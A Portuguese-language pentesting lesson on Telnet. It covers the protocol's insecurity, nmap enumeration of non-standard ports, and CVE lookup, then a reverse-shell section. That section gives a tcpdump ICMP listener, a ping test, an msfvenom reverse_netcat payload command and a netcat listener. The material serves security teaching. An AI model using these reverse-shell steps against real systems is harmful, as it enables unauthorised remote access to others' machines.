# Telnet

*Telnet* é um **protocolo de aplicação**  que permite que você se **conecte e execute comandos** em uma **máquina remota que hospeda um servidor** telnet

O cliente **estabelece uma conexão com o servidor**, O **cliente se torna um terminal** virtual

## Replacement (substituição)

O telnet **envia todas mensagens em texto simples** e não tem nenhum mecanismo de segurança. Então na maioria das vezes ele é **substituido pelo SSH**

## Como o telnet funciona 

O usuário se conecta ao servidor usando o protocolo com `telnet[ip][port]` no terminal

## Enumeração

As vezes, o telnet pode estar **definido em uma porta não padrão**, caso isso aconteça, alguns **comandos de enumeração não funcionarão**, por exemplo:

`$ nmap 10.15.15.4`

A saída do comando retornará que todas as 1000 portas estão filtradas ou fechadas (caso nenhum outro serviço esteja rodando)

Para procurar qualquer tipo de **protocolo rodando em uma porta não padrão** você precisaria usar:

`nmap -p- 10.15.15.4`

Esse comando **escaneia todas as portas**, infelizmente é um **comando mais demorado** mas as vezes é necessário, é **recomendado que você use o comando base**, e caso não funcione você usa a flag `-p-`

**obs: isso funciona para qualquer protocolo rodando em um dispositivo**

### Tipos de exploit telnet

na ([última aula](telnet.md)) falamos por que o telnet é inseguro. Ele não é criptografado, e na maioria das vezes o controle de acesso deles é ruim. Existem CVEs para cliente e servidor telnet, você pode encontrar alguns aqui:

[CVE details](https://www.cvedetails.com/)
[CVE mitre](https://cve.mitre.org/)

Se você não sabe o que é um CVE, volte para a aula [busca de vulnerabilidades](/aulas/OSINT/pesquisa/busca-vulnerabilidades.md)

No caso do telnet, é muito mais comum que você encontre uma potencial vulnerabilidade em uma configuração incorreta 

### Reverse shell

Um reverse shell é um tipo de shell onde a máquina alvo se comunica com a máquina atacante, permitindo acesso remoto

A máquina atacante tem uma porta de escuta, onde recebe a conexão

Um exemplo de ouvinte no telnet seria:

`sudo tcpdump [ip] proto \\icmp -i [net interface]`

Esse exemplo funciona em dispositivos conectados a ethernet

Depois disso você precisa executar um comando ping no telnet    

`ping [ip] -c 1`

Se você receber resposta, você pode executar comandos do sistema no telnet, nesse caso você precisa de um payload para o reverse shell 

`msfvenom -p cmd/unix/reverse_netcat lhost=(local[net interface][ip])lport=[port] R`

- -p = payload
- lhost = Seu endereço de ip
- lport = a porta que vai escutar (a porta da sua máquina)
- R = exportar o payload no formato padrão

Depois de usar esse comando, você só precisa iniciar o ouvinte netcat na sua máquina

`nc -lvp [port]`

